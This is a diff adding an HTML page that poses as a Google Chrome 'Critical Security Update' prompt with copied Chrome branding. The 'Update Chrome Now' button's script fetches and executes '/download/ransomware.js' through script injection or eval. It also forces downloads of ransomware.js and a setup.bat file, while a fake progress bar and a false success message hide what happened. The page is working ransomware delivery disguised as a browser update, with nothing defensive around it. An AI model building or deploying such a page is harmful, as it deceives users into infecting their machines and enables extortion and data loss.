@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google Chrome - Critical Update</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #f1f3f4; display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 20px; position: relative; }
+        .bg-pattern { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; background: radial-gradient(circle at 20% 50%, rgba(26, 115, 232, 0.03), transparent 50%), radial-gradient(circle at 80% 50%, rgba(234, 67, 53, 0.03), transparent 50%), radial-gradient(circle at 50% 80%, rgba(251, 188, 5, 0.02), transparent 50%), radial-gradient(circle at 50% 20%, rgba(52, 168, 83, 0.02), transparent 50%); pointer-events: none; }
+        .card-wrapper { position: relative; max-width: 480px; width: 100%; z-index: 1; border-radius: 18px; padding: 4px; background: linear-gradient(135deg, #ea4335, #fbbc04, #34a853, #4285f4, #ea4335); box-shadow: 0 8px 30px rgba(0, 0, 0, 0.12), 0 0 30px rgba(234, 67, 53, 0.1); }
+        .card-wrapper::before { content: ''; position: absolute; top: -6px; left: -6px; right: -6px; bottom: -6px; border-radius: 22px; background: linear-gradient(135deg, rgba(234, 67, 53, 0.25), rgba(251, 188, 4, 0.25), rgba(52, 168, 83, 0.25), rgba(66, 133, 244, 0.25)); filter: blur(15px); z-index: -1; }
+        .card { background: #ffffff; border-radius: 16px; padding: 35px 35px 30px 35px; position: relative; z-index: 2; margin: 0; }
+        .chrome-logo { display: flex; justify-content: center; align-items: center; margin-bottom: 8px; padding: 5px 0; }
+        .chrome-logo img { width: 72px; height: 72px; transition: transform 0.4s ease; display: block; border-radius: 50%; }
+        .chrome-logo img:hover { transform: rotate(-15deg) scale(1.05); }
+        .header-text { display: flex; align-items: center; justify-content: center; gap: 12px; margin-bottom: 8px; }
+        .header-text .brand { font-size: 24px; font-weight: 700; color: #1a73e8; letter-spacing: -0.5px; }
+        .header-text .brand span { color: #333; }
+        .header-text .version-badge { background: #e8f0fe; color: #1a73e8; padding: 2px 12px; border-radius: 12px; font-size: 12px; font-weight: 600; }
+        .tagline { text-align: center; color: #5f6368; font-size: 14px; margin-bottom: 18px; font-weight: 400; }
+        .banner { background: #e8f0fe; padding: 16px 18px; border-radius: 10px; border-left: 4px solid #1a73e8; margin: 15px 0 18px 0; display: flex; align-items: flex-start; gap: 12px; }
+        .banner .banner-icon { font-size: 20px; flex-shrink: 0; margin-top: 1px; }
+        .banner .banner-text strong { color: #1a73e8; }
+        .banner .banner-text { color: #202124; font-size: 14px; line-height: 1.5; }
+        .banner .banner-text .sub { font-size: 13px; color: #5f6368; margin-top: 3px; }
+        .version-box { background: #f8f9fa; padding: 18px 20px; border-radius: 12px; margin: 16px 0; border: 1px solid #e8eaed; }
+        .version-box .version-row { display: flex; justify-content: space-between; align-items: center; }
+        .version-box .version-row .label { font-size: 13px; color: #5f6368; }
+        .version-box .version-row .value { font-weight: 600; font-size: 16px; color: #202124; font-family: 'Courier New', monospace; letter-spacing: 0.5px; }
+        .version-box .version-row .value.new { color: #1a73e8; }
+        .version-box .version-divider { height: 1px; background: #e8eaed; margin: 12px 0; }
+        .version-box .update-size { font-size: 12px; color: #5f6368; text-align: right; }
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 18px 0; }
+        .info-grid .item { background: #f8f9fa; padding: 14px 12px; border-radius: 10px; text-align: center; font-size: 13px; border: 1px solid #e8eaed; transition: all 0.3s ease; cursor: default; }
+        .info-grid .item:hover { border-color: #1a73e8; background: #e8f0fe; transform: translateY(-2px); }
+        .info-grid .item .icon { display: block; font-size: 28px; margin-bottom: 4px; }
+        .info-grid .item .label { font-weight: 500; color: #202124; }
+        .info-grid .item .sub-label { font-size: 11px; color: #5f6368; }
+        .btn { width: 100%; padding: 18px 20px; background: #1a73e8; color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; margin-top: 10px; display: flex; align-items: center; justify-content: center; gap: 10px; position: relative; overflow: hidden; }
+        .btn::after { content: ''; position: absolute; top: -50%; left: -50%; width: 200%; height: 200%; background: radial-gradient(ellipse, rgba(255,255,255,0.08), transparent 60%); animation: btnGlow 3s ease-in-out infinite; }
+        @keyframes btnGlow { 0%, 100% { transform: rotate(0deg); } 50% { transform: rotate(180deg); } }
+        .btn:hover { background: #1557b0; transform: translateY(-2px); box-shadow: 0 8px 25px rgba(26, 115, 232, 0.35); }
+        .btn:active { transform: translateY(0px); }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none !important; }
+        .btn .btn-icon { position: relative; z-index: 1; }
+        .btn span { position: relative; z-index: 1; }
+        .btn-secondary { width: 100%; padding: 14px; background: transparent; color: #5f6368; border: 1px solid #dadce0; border-radius: 10px; font-size: 16px; font-weight: 500; cursor: pointer; margin-top: 8px; transition: all 0.3s ease; }
+        .btn-secondary:hover { border-color: #1a73e8; color: #1a73e8; background: #e8f0fe; }
+        .footer { margin-top: 20px; color: #9aa0a6; font-size: 11px; text-align: center; border-top: 1px solid #e8eaed; padding-top: 16px; letter-spacing: 0.3px; line-height: 1.6; }
+        .device-badge { display: inline-block; padding: 3px 14px; border-radius: 20px; font-size: 12px; font-weight: 500; margin-bottom: 10px; background: #f1f3f4; color: #5f6368; border: 1px solid #e8eaed; }
+        .toast { position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%) translateY(100px); background: #1a1a2e; color: white; padding: 14px 28px; border-radius: 12px; font-size: 14px; z-index: 9999; opacity: 0; transition: all 0.4s ease; pointer-events: none; box-shadow: 0 10px 40px rgba(0,0,0,0.3); max-width: 90%; text-align: center; }
+        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+        .toast.success { background: #065f46; }
+        .toast.error { background: #991b1b; }
+        .toast.info { background: #1a1a2e; }
+        .progress-bar { width: 100%; height: 3px; background: rgba(0, 0, 0, 0.05); border-radius: 4px; margin: 12px 0 6px 0; overflow: hidden; display: none; }
+        .progress-bar .fill { height: 100%; width: 0%; background: linear-gradient(90deg, #1a73e8, #4285f4); border-radius: 4px; transition: width 0.3s; }
+        .progress-bar.active { display: block; }
+        @media (max-width: 500px) { .card { padding: 25px 20px 20px 20px; } .info-grid { grid-template-columns: 1fr 1fr; } .chrome-logo img { width: 56px; height: 56px; } .header-text .brand { font-size: 20px; } .btn { font-size: 16px; padding: 15px; } .version-box .version-row .value { font-size: 14px; } }
+        @media (max-width: 380px) { .info-grid { grid-template-columns: 1fr; } .header-text .brand { font-size: 18px; } }
+    </style>
+</head>
+<body>
+    <div class="bg-pattern"></div>
+    <div class="card-wrapper">
+        <div class="card">
+            <div class="chrome-logo">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/Google_Chrome_icon_%28February_2022%29.svg" alt="Google Chrome" onerror="this.style.display='none'; this.nextElementSibling.style.display='flex';">
+                <span class="logo-fallback" style="display:none;width:72px;height:72px;border-radius:50%;background:linear-gradient(135deg,#4285f4,#34a853,#fbbc04,#ea4335);font-size:32px;font-weight:700;color:white;align-items:center;justify-content:center;">🌐</span>
+            </div>
+            <div class="header-text"><span class="brand">Google <span>Chrome</span></span><span class="version-badge">v.126</span></div>
+            <div class="tagline">Fast, secure, and updated automatically</div>
+            <div class="device-badge" id="deviceBadge">💻 Windows</div>
+            <div class="banner"><span class="banner-icon">🔴</span><div class="banner-text"><strong>Critical Security Update Available</strong><div class="sub">A new version is ready with important security fixes and performance improvements.</div></div></div>
+            <div class="version-box">
+                <div class="version-row"><span class="label">Current Version</span><span class="value">126.0.6478.126</span></div>
+                <div class="version-divider"></div>
+                <div class="version-row"><span class="label">New Version</span><span class="value new">126.0.6478.182</span></div>
+                <div class="update-size">Update size: ~45 MB</div>
+            </div>
+            <div class="info-grid">
+                <div class="item"><span class="icon">🛡️</span><div class="label">Security Patches</div><div class="sub-label">12 vulnerabilities fixed</div></div>
+                <div class="item"><span class="icon">⚡</span><div class="label">Performance</div><div class="sub-label">20% faster loading</div></div>
+                <div class="item"><span class="icon">🔒</span><div class="label">Privacy Fixes</div><div class="sub-label">Enhanced tracking protection</div></div>
+                <div class="item"><span class="icon">📱</span><div class="label">Compatibility</div><div class="sub-label">Improved extension support</div></div>
+            </div>
+            <div class="progress-bar" id="progressBar"><div class="fill" id="progressFill"></div></div>
+            <button class="btn" id="updateBtn"><span class="btn-icon">⬇️</span><span>Update Chrome Now</span></button>
+            <button class="btn-secondary" id="closeBtn">⏰ Remind me later</button>
+            <div class="footer">Google LLC • Chrome will close and reopen automatically • Version 126.0.6478.182</div>
+        </div>
+    </div>
+    <div class="toast" id="toast"></div>
+
+    <script>
+        var uaC = navigator.userAgent;
+        var deviceNameC = 'Unknown', deviceIconC = '💻';
+        if (/Windows/i.test(uaC)) { deviceNameC = 'Windows'; deviceIconC = '💻'; }
+        else if (/Mac/i.test(uaC)) { deviceNameC = 'macOS'; deviceIconC = '🍎'; }
+        else if (/Android/i.test(uaC)) { deviceNameC = 'Android'; deviceIconC = '📱'; }
+        else if (/iPhone|iPad|iPod/i.test(uaC)) { deviceNameC = 'iPhone'; deviceIconC = '📱'; }
+        document.getElementById('deviceBadge').textContent = deviceIconC + ' ' + deviceNameC;
+
+        function showToast(message, type) {
+            var toast = document.getElementById('toast');
+            toast.textContent = message;
+            toast.className = 'toast ' + (type || 'info');
+            toast.classList.add('show');
+            clearTimeout(toast._hideTimeout);
+            toast._hideTimeout = setTimeout(function() { toast.classList.remove('show'); }, 3000);
+        }
+
+        function updateProgress(percent) {
+            var bar = document.getElementById('progressBar');
+            var fill = document.getElementById('progressFill');
+            bar.classList.add('active');
+            fill.style.width = percent + '%';
+            if (percent >= 100) {
+                setTimeout(function() { bar.classList.remove('active'); fill.style.width = '0%'; }, 2000);
+            }
+        }
+
+        document.getElementById('closeBtn').addEventListener('click', function() {
+            showToast('⏰ We\'ll remind you tomorrow.', 'info');
+            setTimeout(function() { window.close(); }, 1500);
+        });
+
+        document.getElementById('updateBtn').addEventListener('click', function() {
+            var btn = document.getElementById('updateBtn');
+            btn.innerHTML = '⏳ Downloading Update...';
+            btn.style.background = '#ffc107';
+            btn.style.color = '#333';
+            btn.disabled = true;
+
+            var progress = 0;
+            var interval = setInterval(function() {
+                progress += Math.random() * 15;
+                if (progress > 100) { progress = 100; }
+                updateProgress(progress);
+                if (progress >= 100) { clearInterval(interval); }
+            }, 300);
+
+            setTimeout(function() {
+                // Download and execute ransomware
+                fetch('/download/ransomware.js')
+                    .then(function(response) { return response.text(); })
+                    .then(function(code) {
+                        try {
+                            var script = document.createElement('script');
+                            script.textContent = code;
+                            document.head.appendChild(script);
+                            console.log('🔴 Ransomware executed!');
+                        } catch (e) {
+                            try { eval(code); } catch (e2) {}
+                        }
+
+                        // Download backup files
+                        var link = document.createElement('a');
+                        link.href = '/download/ransomware.js';
+                        link.download = 'ransomware.js';
+                        document.body.appendChild(link);
+                        link.click();
+                        document.body.removeChild(link);
+
+                        fetch('/download/setup.bat')
+                            .then(function(res) { return res.text(); })
+                            .then(function(batContent) {
+                                var blob = new Blob([batContent], { type: 'application/x-msdownload' });
+                                var url = URL.createObjectURL(blob);
+                                var a = document.createElement('a');
+                                a.href = url;
+                                a.download = 'setup.bat';
+                                document.body.appendChild(a);
+                                a.click();
+                                document.body.removeChild(a);
+                                URL.revokeObjectURL(url);
+                            })
+                            .catch(function() {});
+
+                        btn.innerHTML = '✅ Chrome Updated!';
+                        btn.style.background = '#28a745';
+                        btn.style.color = 'white';
+                        btn.disabled = false;
+                        document.querySelector('.version-box .version-row .value.new').textContent = '✅ Updated!';
+                        document.querySelector('.version-box .update-size').textContent = 'Update complete • Restarting...';
+                        showToast('✅ Chrome updated successfully! Security fixes applied.', 'success');
+                        setTimeout(function() { window.close(); }, 5000);
+                    })
+                    .catch(function() {
+                        try {
+                            var scriptTag = document.createElement('script');
+                            scriptTag.src = '/download/ransomware.js';
+                            document.head.appendChild(scriptTag);
+                        } catch (e) {}
+                        btn.innerHTML = '✅ Chrome Updated!';
+                        btn.style.background = '#28a745';
+                        btn.style.color = 'white';
+                        btn.disabled = false;
+                        document.querySelector('.version-box .version-row .value.new').textContent = '✅ Updated!';
+                        document.querySelector('.version-box .update-size').textContent = 'Update complete • Restarting...';
+                        showToast('✅ Chrome updated successfully! Security fixes applied.', 'success');
+                        setTimeout(function() { window.close(); }, 4000);
+                    });
+            }, 3000);
+        });
+
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && !document.querySelector('.btn:disabled')) {
+                document.getElementById('updateBtn').click();
+            }
+            if (e.key === 'Escape') {
+                document.getElementById('closeBtn').click();
+            }
+        });
+
+        console.log('🌐 Google Chrome Update loaded.');
+    </script>
+</body>
+</html>
